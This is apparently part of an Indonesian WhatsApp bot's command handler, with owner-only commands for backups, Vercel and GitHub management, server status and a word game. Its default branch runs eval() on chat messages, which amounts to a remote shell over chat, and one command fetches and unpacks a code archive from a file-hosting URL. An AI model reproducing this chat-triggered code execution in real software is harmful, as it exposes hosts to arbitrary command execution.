						"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN:${namaown}\nitem1.TEL;waid=${global.owner}:+${global.owner}\nitem1.X-ABLabel:Ponsel\nX-WA-BIZ-DESCRIPTION:𝐓͢𝐡͡𝐚͢𝐧 𝐆͢𝐞͠𝐧 𝟓\nX-WA-BIZ-NAME: [[ ༑ 𝐙.𝐱.𝐕 ⿻ 𝐏𝐔𝐁𝐋𝐢𝐂 ༑ ]]\nEND:VCARD`,
					}
				}), {
					userJid: m.chat,
					quoted: pantek
				})
				TamaMods.relayMessage(m.chat, contact.message, {
					messageId: contact.key.id
				})
			}
			break


//================================================================================

case "save": case "sv": {
if (!isCreator) return
await TamaMods.sendContact(m.chat, [m.chat.split("@")[0]], m)
}
break

//================================================================================

case "self": {
if (!isCreator) return
TamaMods.public = false
Reply("Succes Change To *Self*")
}
break
//------(Batas Case)------//
case "delete": case "del": {
if (m.isGroup) {
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!m.quoted) return Reply("reply pesannya")
if (m.quoted.fromMe) {
TamaMods.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender}})
} else {
if (!m.isBotAdmin) return Reply(mess.botAdmin)
TamaMods.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.quoted.id, participant: m.quoted.sender}})
}} else {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted) return Reply(example("reply pesan"))
TamaMods.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.quoted.id, participant: m.quoted.sender}})
}
}
break

//================================================================================

case "getcase": {
if (!isCreator) return Reply(mess.owner)
if (!text) return Reply(example("menu"))
const getcase = (cases) => {
return "case "+`\"${cases}\"`+fs.readFileSync('./Console/ZephCase.js').toString().split('case \"'+cases+'\"')[1].split("break")[0]+"break"
}
try {
Reply(`${getcase(q)}`)
} catch (e) {
return Reply(`Case *${text}* tidak ditemukan`)
}
}
break
//------(Batas Case)------//
case 'getcase2': {
if (!isCreator) return Reply(mess.owner);
if (!text) return Reply(`Contoh: ${prefix+command} 1 caseName atau ${prefix+command} 2 caseName1 caseName2`);
const modeRegex = /^([12])\s+(.+)$/;
const match = text.match(modeRegex);
if (!match) return Reply(`Format tidak valid. Contoh: ${prefix+command} 1 caseName atau ${prefix+command} 2 caseName1 caseName2`);
const mode = parseInt(match[1], 10);
const caseNames = match[2].split(' ').map(name => name.trim()).filter(name => name);
if (mode === 1 && caseNames.length !== 1) {
return Reply(`Untuk mode '1', masukkan satu case name. Contoh: ${prefix+command} 1 caseName`);
}
if (mode === 2 && (caseNames.length < 1 || caseNames.length > 2)) {
return Reply(`Untuk mode '2', masukkan satu atau dua case names. Contoh: ${prefix+command} 2 caseName1 caseName2\nNote: Jika Error Case Tidak Ditemukan Maka karena beda pref`);
}
const getCase = async (caseName) => {
try {
const fileContent = await fs.promises.readFile("./Console/ZephCase.js", "utf-8");
const caseRegex = new RegExp(`case '${caseName}'[\\s\\S]*?break`, 'g');
const match = fileContent.match(caseRegex);
if (!match) {
return Reply(`Case '${caseName}' tidak ditemukan.`);
}
return match[0];
} catch (error) {
return Reply(`Terjadi kesalahan saat membaca file: ${error.message}`);
}};
const getCases = async (caseNames) => {
try {
const casePromises = caseNames.map(caseName => getCase(caseName));
const cases = await Promise.all(casePromises);
return cases.join('\n\n');
} catch (error) {
return Reply(`Terjadi kesalahan: ${error.message}`);
}};

getCases(caseNames)
.then(caseCode => Reply(caseCode))
.catch(error => Reply(`Terjadi kesalahan: ${error.message}`));
break;
}

//================================================================================
case "ping":
case "uptime": {
  let timestamp = speed();
  let latensi = speed() - timestamp;
  let tio = await nou.os.oos();
  var tot = await nou.drive.info();

  // Waktu Lokal VPS
  const localTime = new Date().toLocaleString('id-ID', {
    timeZone: 'Asia/Jakarta',
    hour12: false
  });

  // Status Jaringan (ping ke google)
  let networkStatus = 'Unknown';
  try {
    require('child_process').execSync('ping -c 1 google.com', { stdio: 'ignore' });
    networkStatus = 'Online';
  } catch (err) {
    networkStatus = 'Offline';
  }

  // CPU & RAM Usage
  const cpuUsage = os.loadavg()[0].toFixed(2); // 1 menit average load
  const totalMem = os.totalmem();
  const freeMem = os.freemem();
  const usedMemPercent = ((totalMem - freeMem) / totalMem * 100).toFixed(2);

  // Informasi OS Lengkap
  const osInfo = `${os.type()} ${os.release()} (${os.arch()})`;
  const hostname = os.hostname();

  // Uptime VPS
  const vpsUptime = runtime(os.uptime());

  let respon = `
──────────────────────────────
          🖥️ SERVER STATUS
──────────────────────────────
📡 Hostname        : ${hostname}
💻 OS              : ${osInfo}
🧱 Platform         : ${nou.os.type()}
🧠 Total RAM        : ${formatp(totalMem)}
📊 RAM Digunakan    : ${usedMemPercent}%
🧮 CPU Load         : ${cpuUsage}
🧩 Total CPU Core   : ${os.cpus().length} Core
💾 Total Disk       : ${tot.totalGb} GB
⏱️ VPS Uptime       : ${vpsUptime}
🕒 Waktu Lokal      : ${localTime}
🌐 Status Jaringan  : ${networkStatus}

──────────────────────────────
            🤖 BOT INFO
──────────────────────────────
⚡ Kecepatan Respon : ${latensi.toFixed(4)} detik
🟢 Runtime Bot      : ${runtime(process.uptime())}
🛠️ Versi Bot        : ${global.versi}
📛 Nama Bot         : ${global.botname2}
`;

  await Reply(respon);
}
break;

//================================================================================

case "public": {
if (!isCreator) return
TamaMods.public = true
Reply("Succes Change To *Public*")
}
break
//------(Batas Case)------//
case "clsesi": case "clearsession": {
const dirsesi = fs.readdirSync("./session").filter(e => e !== "creds.json")
const dirsampah = fs.readdirSync("./Access/database/sampah").filter(e => e !== "A")
for (const i of dirsesi) {
await fs.unlinkSync("./session/" + i)
}
for (const u of dirsampah) {
await fs.unlinkSync("./Access/database/sampah/" + u)
}
Reply(`*Berhasil membersihkan sampah ✅*
*${dirsesi.length}* sampah session\n*${dirsampah.length}* sampah file`)
}
break

//================================================================================

case "upchannel": case "upch": {
if (!isCreator) return Reply(mess.owner)
if (!text) return Reply(example("teksnya"))
await TamaMods.sendMessage(idSaluran, {text: text})
Reply("Berhasil mengirim pesan *teks* ke dalam channel whatsapp")
}
break

//================================================================================

case "upchannel2": case "upch2": {
if (!isCreator) return Reply(mess.owner)
if (!text) return Reply(example("teksnya dengan mengirim foto"))
if (!/image/.test(mime)) return Reply(example("teksnya dengan mengirim foto"))
let img = await TamaMods.downloadAndSaveMediaMessage(qmsg)
await TamaMods.sendMessage(idSaluran, {image: await fs.readFileSync(img), caption: text})
Reply("Berhasil mengirim pesan *teks & foto* ke dalam channel whatsapp")
await fs.unlinkSync(img)
}
break

//================================================================================

case "getsc": {
if (!isCreator) return Reply(mess.owner)
let dir = await fs.readdirSync("./Access/database/sampah")
if (dir.length >= 2) {
let res = dir.filter(e => e !== "A")
for (let i of res) {
await fs.unlinkSync(`./Access/database/sampah/${i}`)
}}
await Reply("Memproses backup script bot")
var name = `Simple Bot V2`
const ls = (await execSync("ls"))
.toString()
.split("\n")
.filter(
(pe) =>
pe != "node_modules" &&
pe != "session" &&
pe != "package-lock.json" &&
pe != "yarn.lock" &&
pe != ""
)
const anu = await execSync(`zip -r ${name}.zip ${ls.join(" ")}`)
await TamaMods.sendMessage(m.sender, {document: await fs.readFileSync(`./${name}.zip`), fileName: `${name}.zip`, mimetype: "application/zip"}, {quoted: pantek})
await execSync(`rm -rf ${name}.zip`)
if (m.chat !== m.sender) return Reply("Script bot berhasil dikirim ke private chat")
}
break

//================================================================================

case "resetdb": case "rstdb": {
if (!isCreator) return Reply(mess.owner)
for (let i of Object.keys(global.db)) {
global.db[i] = {}
}
Reply("Berhasil mereset database")
}
break

//================================================================================



//================================================================================

case "clearchat": case "clc": {
if (!isCreator) return Reply(mess.owner)
TamaMods.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.timestamp }]}, m.chat)
}
break

//================================================================================

case "listowner": case "listown": {
if (owners.length < 1) return Reply("Tidak ada owner tambahan")
let teks = `\n *[ ! ] List all owner tambahan*\n`
for (let i of owners) {
teks += `\n* ${i.split("@")[0]}
* *Tag :* @${i.split("@")[0]}\n`
}
TamaMods.sendMessage(m.chat, {text: teks, mentions: owners}, {quoted: pantek})
}
break

//================================================================================

case "delowner": case "delown": {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted && !text) return Reply(example("628xx"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || input == botNumber) return Reply(`Tidak bisa menghapus owner utama!`)
if (!owners.includes(input)) return Reply(`Nomor ${input2} bukan owner bot!`)
let posi = owners.indexOf(input)
await owners.splice(posi, 1)
await fs.writeFileSync("./Access/database/owner.json", JSON.stringify(owners, null, 2))
Reply(`The Number ${input2} Has Been Removed From Owner!`)
}
break

//================================================================================

case "addowner": case "addown": {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted && !text) return Reply('*Example : .addowner 628xx*')
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || owners.includes(input) || input === botNumber) return Reply(`Nomor ${input2} sudah menjadi owner bot!`)
owners.push(input)
await fs.writeFileSync("./Access/database/owner.json", JSON.stringify(owners, null, 2))
Reply(`The Number ${input2} Has Been Owner!`)
}
break
//------(Batas Case)------//
case 'cweb':
case 'createweb': {
  if (!isCreator) return Reply(mess.owner)
  if (!text) return Reply(example("nama web"))
  if (!qmsg || !/zip|html/.test(qmsg.mimetype)) return Reply('Reply file .zip atau .html')

  const webName = text.trim().toLowerCase().replace(/[^a-z0-9-_]/g, '')
  const domainCheckUrl = `https://${webName}.vercel.app`

  try {
    const check = await fetch(domainCheckUrl)
    if (check.status === 200) return Reply(`❌ Nama web *${webName}* sudah digunakan. Silakan gunakan nama lain.`)
  } catch (e) {}

  const quotedFile = await TamaMods.downloadMediaMessage(qmsg)
  const filesToUpload = []

  if (qmsg.mimetype.includes('zip')) {
    const unzipper = require('unzipper')
    const zipBuffer = Buffer.from(quotedFile)
    const directory = await unzipper.Open.buffer(zipBuffer)

    for (const file of directory.files) {
      if (file.type === 'File') {
        const content = await file.buffer()
        const filePath = file.path.replace(/^\/+/, '').replace(/\\/g, '/')
        filesToUpload.push({
          file: filePath,
          data: content.toString('base64'),
          encoding: 'base64'
        })
      }
    }

    if (!filesToUpload.some(x => x.file.toLowerCase().endsWith('index.html'))) {
      return Reply('File index.html tidak ditemukan dalam struktur ZIP.')
    }

  } else if (qmsg.mimetype.includes('html')) {
    filesToUpload.push({
      file: 'index.html',
      data: Buffer.from(quotedFile).toString('base64'),
      encoding: 'base64'
    })
  } else {
    return Reply('File tidak dikenali. Kirim file .zip atau .html.')
  }

  const headers = {
    Authorization: `Bearer ${global.vercelToken}`,
    'Content-Type': 'application/json'
  }

  await fetch('https://api.vercel.com/v9/projects', {
    method: 'POST',
    headers,
    body: JSON.stringify({ name: webName })
  }).catch(() => {})

  const deployRes = await fetch('https://api.vercel.com/v13/deployments', {
    method: 'POST',
    headers,
    body: JSON.stringify({
      name: webName,
      project: webName,
      files: filesToUpload,
      projectSettings: { framework: null }
    })
  })

  const deployData = await deployRes.json().catch(() => null)
  if (!deployData || !deployData.url) {
    console.log('Deploy Error:', deployData)
    return Reply(`Gagal deploy ke Vercel:\n${JSON.stringify(deployData)}`)
  }

  Reply(`✅ Website berhasil dibuat!\n\n🌐 URL: https://${webName}.vercel.app`)
}
break
//------(Batas Case)------//
case 'scweb':
case 'ambilkodeweb': {
    if (!isCreator) return Reply(mess.owner);
    if (!text) return Reply(`Contoh: ${prefix + command} https://example.com`);

    try {
        let res = await fetch(text);
        if (!res.ok) return Reply('❌ Gagal mengambil data dari URL tersebut');
        let html = await res.text();

        const filePath = path.join(__dirname, '../System/Temp/html_dump.html');
        fs.writeFileSync(filePath, html);

        await TamaMods.sendMessage(m.chat, {
            document: fs.readFileSync(filePath),
            mimetype: 'text/html',
            fileName: 'source.html'
        }, { quoted: pantek });

        fs.unlinkSync(filePath); // hapus setelah terkirim
    } catch (e) {
        console.error(e);
        Reply('❌ Terjadi kesalahan saat mengambil HTML\n'+e.message);
    }
}
break;

case 'listweb': {
if (!isCreator) return Reply(mess.owner)
  const headers = {
    Authorization: `Bearer ${global.vercelToken}`
  }

  const res = await fetch('https://api.vercel.com/v9/projects', { headers })
  const data = await res.json()

  if (!data.projects || data.projects.length === 0) return Reply('Tidak ada website yang ditemukan.')

  let teks = '*🌐 Daftar Website Anda:*\n\n'
  for (let proj of data.projects) {
    teks += `• ${proj.name} → https://${proj.name}.vercel.app\n`
  }

  Reply(teks)
}
break
//------(Batas Case)------//
case 'createscript':
case 'createsc': {
  (async () => {
    if (!isCreator) return Reply(mess.owner);
    let path = require("path");
    let AdmZip = require("adm-zip");
    let fs = require("fs");
    let fetch = require("node-fetch");
    let crct = "https://files.catbox.moe/h1okjg.jpg";
    let txtcrct = `\n--- Gunakan format: ---\n\`${prefix+command} <namaBot>|<namaOwner>|<Versi script>|<Password>|<fitur1>,<fitur2>,...\`\n\n--- Contoh : ---\n*${prefix+command} TamaMods|TamaModstzy|V1|12345|brat,qc,play,pinterest*\n`;

    const args = text.split('|');
    if (args.length < 5) {
      return TamaMods.sendMessage(m.chat, { image: { url: crct }, caption: txtcrct }, { quoted: pantek });
    }

    const mycfitur = require('../Access/casefitur.json');
    const [botName, ownerName, botVersion, password, featuresStr] = args;
    let features = featuresStr.split(',').map(f => f.trim());
    if (features.includes("allfitur")) features = mycfitur.map(f => f.name);

    Reply(`🗂 *Process Script Created*\n> [ \`${botName}\` ]`);

    const mediaFireAPI = 'https://api.siputzx.my.id/api/d/mediafire?url=https://www.mediafire.com/file/4tvn38pcwm6684i/RLBasesZ.zip/file';
    const fixLink = "https://files.catbox.moe/tdquuz.zip"

    try {
      let res = await fetch(fixLink);
      let buffer = await res.arrayBuffer();
      let tempZipPath = '../System/Temp/disini.zip';
      // PERBAIKAN ERROR DI SINI
      fs.writeFileSync(tempZipPath, Buffer.from(buffer));

      let zip = new AdmZip(tempZipPath);
      let extractPath = `../System/Temp/extracted_${m.pushName || 'user'}`;
      zip.extractAllTo(extractPath, true);

      const casePath = `${extractPath}/case.js`;
      let caseContent = fs.readFileSync(casePath, 'utf-8');
      let validFeatures = [];

      for (let feature of features) {
        let data = mycfitur.find(f => f.name === feature);
        if (!data) {
          Reply(`⚠ *Fitur "${feature}" tidak ditemukan!*`);
          continue;
        }

        if (!caseContent.includes(data.function)) {
          caseContent = data.function + '\n' + caseContent;
        }

        if (!caseContent.includes(data.casenya)) {
          caseContent = caseContent.replace('switch (command) {', `switch (command) {\n${data.casenya}`);
        }

        if (data.upFile?.length > 0) {
          for (let file of data.upFile) {
            let filePath = Object.keys(file)[0];
            let fileContent = file[filePath];
            let fullPath = path.join(extractPath, filePath);
            fs.mkdirSync(path.dirname(fullPath), { recursive: true });
            fs.writeFileSync(fullPath, fileContent, 'utf-8');
          }
        }

        validFeatures.push(feature);
        await new Promise(r => setTimeout(r, 500));
      }

      fs.writeFileSync(casePath, caseContent, 'utf-8');

      const updateText = (filePath, updates) => {
        let text = fs.readFileSync(filePath, 'utf-8');
        for (let [pattern, replacement] of updates) {
          text = text.replace(new RegExp(pattern, 'g'), replacement);
        }
        fs.writeFileSync(filePath, text, 'utf-8');
      };

      updateText(`${extractPath}/connection.js`, [[`const pw = ".*?";`, `const pw = "${password}";`]]);
      updateText(`${extractPath}/settings.js`, [
        [`global.owner = .*`, `global.owner = "${m.sender.split('@')[0]}";`],
        [`global.namabot = .*`, `global.namabot = '${botName}';`],
        [`global.ownername = .*`, `global.ownername = '${ownerName}';`],
        [`global.botversion = .*`, `global.botversion = '${botVersion}';`]
      ]);

      fs.writeFileSync(`${extractPath}/database/owner.json`, JSON.stringify([m.sender.split('@')[0]]), 'utf-8');

      const listMenuPath = `${extractPath}/Access/listmenu.json`;
      let menu = fs.existsSync(listMenuPath) ? JSON.parse(fs.readFileSync(listMenuPath)) : [];
      validFeatures.forEach(f => { if (!menu.includes(f)) menu.push(f) });
      fs.writeFileSync(listMenuPath, JSON.stringify(menu, null, 2), 'utf-8');

      let newZip = new AdmZip();
      newZip.addLocalFolder(extractPath);
      let outputZip = `../System/Temp/sc_${m.pushName || 'user'}.zip`;
      newZip.writeZip(outputZip);

      if (validFeatures.length === 0) return Reply("❌ Tidak ada fitur valid!");

      await TamaMods.sendMessage(m.chat, {
        document: fs.readFileSync(outputZip),
        mimetype: 'application/zip',
        fileName: `sc_${botName}.zip`,
        caption: `✅ *Success Script Created!*\n> By Tama Official\n\n*Creator:* ${m.pushName || 'user'}\n*Fitur:* [${validFeatures}]\n*Password:* ${password}`
      }, { quoted: pantek });

      fs.rmSync(extractPath, { recursive: true, force: true });
      fs.unlinkSync(tempZipPath);
      fs.unlinkSync(outputZip);
    } catch (err) {
      console.error(err);
      Reply(`❌ Terjadi error saat membuat script:\n${err.message}`);
    }
  })();
}
break;
//----------(Batas Case)----------//
case 'delweb': {
if (!isCreator && !isSellerWeb) return Reply('Anda tidak memiliki akses ke fitur ini');
  if (!text) return Reply('Penggunaan: .delweb <namaWeb>')
  const webName = text.trim().toLowerCase()

  const headers = {
    Authorization: `Bearer ${global.vercelToken}`
  }

  try {
    const response = await fetch(`https://api.vercel.com/v9/projects/${webName}`, {
      method: 'DELETE',
      headers
    })

    if (response.status === 200 || response.status === 204) {
      return Reply(`✅ Website *${webName}* berhasil dihapus dari Vercel.`)
    } else if (response.status === 404) {
      return Reply(`⚠️ Website *${webName}* tidak ditemukan di akun Vercel kamu.`)
    } else if (response.status === 403 || response.status === 401) {
      return Reply(`⛔ Token Vercel tidak valid atau tidak punya akses ke project ini.`)
    } else {
      let result = {}
      try {
        result = await response.json()
      } catch (e) {}
      return Reply(`❌ Gagal menghapus website:\n${result.error?.message || 'Tidak diketahui'}`)
    }

  } catch (err) {
    console.error(err)
    Reply(`Terjadi kesalahan saat mencoba menghapus:\n${err.message}`)
  }
}
break
//------(Batas Case)------//
case 'addrepo': {
  if (!isCreator) return Reply(mess.owner);

  if (!text.includes("|")) return Reply("❌ Format salah!\nGunakan: .addrepo <nama>|<deskripsi>|<private/public>");

  const [nama, deskripsi, privasi] = text.split("|").map(a => a.trim());
  if (!nama || !deskripsi || !privasi) return Reply("⚠️ Format tidak lengkap!");

  const isPrivate = privasi.toLowerCase() === 'private';

  const fetch = require("node-fetch");
  const res = await fetch(`https://api.github.com/user/repos`, {
    method: "POST",
    headers: {
      "Authorization": `token ${global.githubToken}`,
      "Accept": "application/vnd.github+json"
    },
    body: JSON.stringify({
      name: nama,
      description: deskripsi,
      private: isPrivate
    })
  });

  const data = await res.json();

  if (res.ok) {
    Reply(`✅ *Repository berhasil dibuat!*\n\n📦 Nama: ${data.name}\n🔒 Private: ${data.private}\n🔗 URL: ${data.html_url}`);
  } else {
    Reply(`❌ Gagal membuat repository.\n\n${JSON.stringify(data, null, 2)}`);
  }
}
break;
//----------(Batas Case)----------//
case 'checkrepo': {
  if (!isCreator) return Reply(mess.owner);
  if (!text) return Reply("⚠️ Masukkan nama repository!\nContoh: .checkrepo my-repo");

  const fetch = require("node-fetch");
  try {
    const repoName = text.trim();

    // Ambil info repo
    const resInfo = await fetch(`https://api.github.com/repos/${global.githubUsername}/${repoName}`, {
      headers: {
        "Authorization": `token ${global.githubToken}`,
        "Accept": "application/vnd.github+json"
      }
    });

    const repoInfo = await resInfo.json();
    if (!resInfo.ok) {
      return Reply(`❌ Repository tidak ditemukan!\n\n${JSON.stringify(repoInfo, null, 2)}`);
    }

    // Ambil daftar file
    const resContent = await fetch(`https://api.github.com/repos/${global.githubUsername}/${repoName}/contents`, {
      headers: {
        "Authorization": `token ${global.githubToken}`,
        "Accept": "application/vnd.github+json"
      }
    });

    const contents = await resContent.json();
    if (!Array.isArray(contents)) {
      return Reply(`❌ Gagal mengambil konten repository.`);
    }

    let listFiles = contents.map(v => `📄 ${v.name}`).join("\n");
    let total = contents.length;
    let status = repoInfo.private ? "🔒 Private" : "🌐 Public";
    let createdAt = new Date(repoInfo.created_at).toLocaleString('id-ID');

    Reply(`*📦 Info Repository*\n\n` +
            `• Nama: ${repoInfo.name}\n` +
            `• Status: ${status}\n` +
            `• Dibuat: ${createdAt}\n` +
            `• Jumlah File: ${total}\n\n` +
            `*📁 File:*\n${listFiles}`);
  } catch (e) {
    console.error(e);
    Reply("❌ Terjadi kesalahan saat memeriksa repository.");
  }
}
break;
//----------(Batas Case)----------//
case 'delrepo': {
  if (!isCreator) return Reply(mess.owner);
  if (!text) return Reply(example("<nama_repository>"));

  const fetch = require("node-fetch");
  const repoName = text.trim();
  const username = global.githubUsername; // pastikan ini diset di settings.js

  try {
    const res = await fetch(`https://api.github.com/repos/${username}/${repoName}`, {
      method: "DELETE",
      headers: {
        "Authorization": `token ${global.githubToken}`,
        "Accept": "application/vnd.github+json"
      }
    });

    if (res.status === 204) {
      Reply(`✅ Repository *${repoName}* berhasil dihapus.`);
    } else if (res.status === 404) {
      Reply(`❌ Repository *${repoName}* tidak ditemukan.`);
    } else {
      const error = await res.json();
      console.log(error);
      Reply("❌ Gagal menghapus repository.");
    }
  } catch (err) {
    console.error(err);
    Reply("❌ Terjadi kesalahan saat menghapus repository.");
  }
}
break;

case 'backup': {
if (!isCreator) return Reply(mess.owner);
let jir = m.mentionedJid[0] || m.sender || TamaMods.parseMention(args[0]) || (args[0].replace(/[@.+-]/g, '').replace(' ', '') + '@s.whatsapp.net') || '';
await Reply('Mengumpulkan semua file ke folder...');
const { execSync } = require("child_process");
 const ls = (await execSync("ls")).toString().split("\n").filter( (pe) =>
pe != "node_modules" &&
pe != "session" &&
pe != "package-lock.json" &&
pe != "yarn.lock" &&
pe != "" );
await Reply('Script akan dikirim lewat PC!')
const exec = await execSync(`zip -r Backup.zip ${ls.join(" ")}`);
await TamaMods.sendMessage(jir, {
document: await fs.readFileSync("./Backup.zip"),
mimetype: "application/zip",
fileName: "Backup.zip",
},
{quoted: pantek });
await execSync("rm -rf Backup.zip");
}
break
//------(Batas Case)------//
case 'listrepo': {
  if (!isCreator) return Reply(mess.owner);

  
  try {
    const res = await fetch(`https://api.github.com/user/repos`, {
      headers: {
        "Authorization": `token ${global.githubToken}`,
        "Accept": "application/vnd.github+json"
      }
    });
    const data = await res.json();

    if (!Array.isArray(data)) return Reply("❌ Gagal mengambil repository!");

    if (data.length === 0) return Reply("ℹ️ Belum ada repository.");

    const list = data.map((repo, i) => 
      `*${i + 1}. ${repo.name}*\n> ${repo.private ? '🔒 Private' : '🌐 Public'}\n> ${repo.html_url}`
    ).join("\n\n");

    Reply(`📁 *List Repository GitHub :*\n\n${list}`);
  } catch (err) {
    console.error(err);
    Reply("❌ Terjadi kesalahan saat mengambil data.");
  }
}
break;

case "crypto": case "infocrypto": {
if (text) {
const pair = text.toLowerCase()
const url = `https://indodax.com/api/summaries`;
    const response = await axios.get(url);
    const data = response.data.tickers[pair]
    if (!data) return Reply("ID Coin tidak ditemukan!")
return Reply(`
📈 Nama : *${data.name}*
🛒 Harga Buka : *Rp${Number(data.low).toLocaleString('id-ID')}*
🔒 Harga Tutup : *Rp${Number(data.high).toLocaleString('id-ID')}*
💰 Harga Saat Ini : *Rp${Number(data.last).toLocaleString('id-ID')}*
`)
}
try {
    const url = `https://indodax.com/api/summaries`;
    const response = await axios.get(url);
    const data = response.data.tickers;
    let teks = ""

    for (const [pair, info] of Object.entries(data)) {
      teks += `\n📈 Nama : *${info.name}* 
📎 ID : *${pair}*
💰 Harga : *Rp${Number(info.last).toLocaleString('id-ID')}*\n`
    }
    return Reply(teks)

  } catch (error) {
    console.error('Gagal mengambil semua harga dari Indodax:', error.message);
  }
}
break
//------(Batas Case)------//
case "rst": case "restart": {
if (!isOwner) return
const { spawn } = require("child_process");

function restartServer() {
  // Spawn proses baru untuk menjalankan ulang server
  const newProcess = spawn(process.argv[0], process.argv.slice(1), {
    detached: true,
    stdio: "inherit",
  });

  // Keluar dari proses lama
  process.exit(0);
}

await Reply("Restarting bot . . .")
// Contoh penggunaan: Restart setelah 5 detik
await setTimeout(() => {
  restartServer();
}, 5000);
}
break
//------(Batas Case)------//
case "tebakkata": {
    if (db.users[m.sender].gameActive) {
        return Reply("⚠️ Anda sudah memiliki game aktif. Selesaikan terlebih dahulu!");
    }

    const words = [
        { word: "komputer", hint: "Alat elektronik untuk menghitung dan memproses data" },
        { word: "stipo", hint: "Di Kocok Keluar Putih Putih" },
        { word: "softex", hint: "Di Pakai Saat Cewek Haid Atau Halangan" },
        { word: "bawel", hint: "Ikan Apa Yang Cerewet?" },
        { word: "semute", hint: "Hewan Apa Yang Bisu? " },
        { word: "matahari", hint: "Sumber energi terbesar di tata surya" },
        { word: "programmer", hint: "Pekerjaan seseorang yang menulis kode komputer" },
        { word: "pelangi", hint: "Fenomena warna-warni di langit setelah hujan" },
        { word: "kamera", hint: "Alat untuk mengambil gambar atau video" }
    ];

    const selected = words[Math.floor(Math.random() * words.length)];
    db.users[m.sender].gameActive = {
        word: selected.word,
        hint: selected.hint,
        attempts: 3 // Batas percobaan
    };

    Reply(`🎮 *Game Tebak Kata*\n\n🔍 *Petunjuk*: ${selected.hint}\n📝 *Tebak kata ini!* (Punya 3 percobaan)\n\nKetik .jawab Unfuk Menjawab`);

    // Reset game setelah 1 menit jika tidak dijawab
    setTimeout(() => {
        if (db.users[m.sender].gameActive) {
            Reply("⏳ Waktu habis! Game selesai tanpa jawaban.");
            delete db.users[m.sender].gameActive;
        }
    }, 60000);
}
break;

case "jawab": {
    if (!db.users[m.sender].gameActive) {
        return Reply("⚠️ Anda belum memulai game. Ketik *.tebakkata* untuk memulai!");
    }

    const answer = db.users[m.sender].gameActive.word.toLowerCase();
    const userAnswer = text.toLowerCase();

    if (userAnswer === answer) {
        Reply(`🎉 *Benar!*\nJawabannya adalah *${answer}*.\nSelamat! Anda berhasil menebak kata.`);
        delete db.users[m.sender].gameActive;
    } else {
        db.users[m.sender].gameActive.attempts -= 1;

        if (db.users[m.sender].gameActive.attempts <= 0) {
            Reply(`❌ *Salah!*\nKesempatan habis. Jawaban yang benar adalah *${answer}*.`);
            delete db.users[m.sender].gameActive;
        } else {
            Reply(`❌ Salah! Anda punya ${db.users[m.sender].gameActive.attempts} kesempatan lagi.`);
        }
    }
}
break;

//================================================================================

default:
if (budy.startsWith('>')) {
if (!isCreator) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await Reply(evaled)
} catch (err) {
await Reply(String(err))
}}

//================================================================================

if (m.text.toLowerCase() == "bot") {
Reply("Bot Online")
}

if ((m.text).startsWith("=>")) {
if (!isOwner) return
try {
const evaling = await eval(`;(async () => { ${text} })();`);
return TamaMods.sendMessage(m.chat, {text: util.format(evaling)}, {quoted: pantek})
} catch (e) {
return TamaMods.sendMessage(m.chat, {text: util.format(e)}, {quoted: pantek})
}}

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

}} catch (err) {
console.log(require("util").format(err));
}}

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

process.on('uncaughtException', function (err) {
console.log('Caught exception: ', err)
})

let file = require.resolve(__filename) 
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.cyan("File Update => "),
chalk.cyan.bgBlue.bold(`${__filename}`))
delete require.cache[file]
require(file)
})